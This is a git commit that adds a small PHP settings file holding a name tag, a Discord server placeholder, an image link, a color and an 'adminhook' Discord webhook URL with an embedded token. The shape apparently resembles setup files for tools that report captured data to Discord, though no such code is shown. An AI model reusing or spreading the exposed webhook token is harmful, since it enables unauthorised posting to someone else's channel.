b85505d135ce9b612cedafe7ccb0fc89e7e6623f
4dammmm <adamciao29@gmail.com>
2025-10-03 00:31:57 +0200

    Add files via upload

---
+++ settings.php
@@ -0,0 +1,8 @@
+<?php
+# ItsYaboyNathan
+$name = "Nathan";
+$discord = "INPUT UR DISCORD SERVER HERE";
+$image = "https://i.pinimg.com/originals/e9/3c/76/e93c766198a8db2656d42fc17dca722f.gif";
+$color = "00000";
+$adminhook = "https://discord.com/api/webhooks/1422941065924579459/qK_6GGKB9WA6phJk2oZZCX869nlgJyZIaf3pY-Nk-KN_d-t_8Kc5ongPKLgERn7QpBGJ";
+?>
